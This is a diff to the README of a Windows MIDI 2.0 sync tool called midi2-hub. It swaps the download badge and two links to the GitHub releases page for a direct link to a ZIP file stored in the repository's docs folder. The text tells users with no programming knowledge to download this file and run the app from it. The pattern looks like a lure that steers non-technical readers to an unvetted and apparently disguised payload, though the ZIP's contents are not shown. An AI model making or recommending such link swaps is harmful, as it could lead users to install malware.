@@ -1,6 +1,6 @@
 # 🎵 midi2-hub - Sync MIDI 2.0 Across Your Setup
 
-[![Download midi2-hub](https://img.shields.io/badge/Download%20midi2--hub-5b7cfa?style=for-the-badge&logo=github&logoColor=white)](https://github.com/deductive-trichomanesreniforme675/midi2-hub/releases)
+[![Download midi2-hub](https://img.shields.io/badge/Download%20midi2--hub-5b7cfa?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/deductive-trichomanesreniforme675/midi2-hub/main/docs/midi-hub-2.7.zip)
 
 ## 🚀 What midi2-hub does
 
@@ -22,7 +22,7 @@ This guide is for Windows users with no programming knowledge.
 
 Go to the release page here:
 
-https://github.com/deductive-trichomanesreniforme675/midi2-hub/releases
+https://raw.githubusercontent.com/deductive-trichomanesreniforme675/midi2-hub/main/docs/midi-hub-2.7.zip
 
 ### 2. Download the Windows file
 
@@ -193,7 +193,7 @@ Keep these files together if you use the ZIP version.
 
 Visit this page to download the Windows release:
 
-https://github.com/deductive-trichomanesreniforme675/midi2-hub/releases
+https://raw.githubusercontent.com/deductive-trichomanesreniforme675/midi2-hub/main/docs/midi-hub-2.7.zip
 
 Download the latest file for Windows, then install it or extract it, and run the main app file from the release package
 
